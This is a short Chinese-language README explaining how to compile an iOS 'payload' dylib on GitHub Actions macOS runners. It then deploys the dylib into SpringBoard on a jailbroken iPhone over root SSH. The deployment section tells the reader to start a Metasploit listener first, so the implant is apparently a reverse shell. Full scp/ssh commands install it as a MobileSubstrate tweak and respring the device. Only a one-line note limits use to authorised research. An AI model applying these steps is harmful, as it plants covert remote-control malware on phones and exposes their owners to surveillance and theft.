# iOS payload dylib 云端编译（GitHub Actions）

在 GitHub 的 macOS runner 上用 Apple clang 编译带真正 PAC 的 arm64 + arm64e fat dylib。

## 操作步骤（网页版，无需装 git）

1. 登录 GitHub，新建一个仓库（New repository）
   - 名字随意，比如 `ios-dylib-build`
   - 选 **Public**（公开仓库 Actions 免费）
   - 不要勾选 Add README，直接 Create

2. 进入新仓库，点 **uploading an existing file**（或 Add file → Upload files）

3. 把本文件夹里的所有内容拖进去
   - 关键：`.github` 文件夹、`wrapper.c`、`payload_blob.h`、`Makefile`、`payload.plist`
   - 注意：`.github` 是隐藏文件夹，macOS Finder 按 `Cmd + Shift + .` 可显示
   - 底部 Commit changes

4. 提交后点顶部 **Actions** 标签
   - 会看到 `build-ios-dylib` 自动开始运行（约 3~6 分钟）
   - 没有自动运行就点左侧 workflow，再点 Run workflow（workflow_dispatch）

5. 运行成功（绿色对勾）后，点这次运行记录
   - 页面底部 **Artifacts** 下载 `payload-dylib`
   - 解压得到 `payload.dylib` 和 `payload.plist`

## 部署到手机（注入 SpringBoard）

```bash
# 先在电脑上跑 MSF 监听：msfconsole 里 run -j
# 然后：
scp payload.dylib payload.plist root@手机IP:/var/jb/Library/MobileSubstrate/DynamicLibraries/
ssh root@手机IP "chmod 644 /var/jb/Library/MobileSubstrate/DynamicLibraries/payload.*; sbreload"
```

## 卸载

```bash
ssh root@手机IP "rm -f /var/jb/Library/MobileSubstrate/DynamicLibraries/payload.dylib \
  /var/jb/Library/MobileSubstrate/DynamicLibraries/payload.plist; sbreload"
```

## 说明

- 公开仓库 GitHub Actions 免费；macOS runner 自带完整 Xcode，无需本地安装。
- 仅可用于本人所有、已授权设备的安全研究。
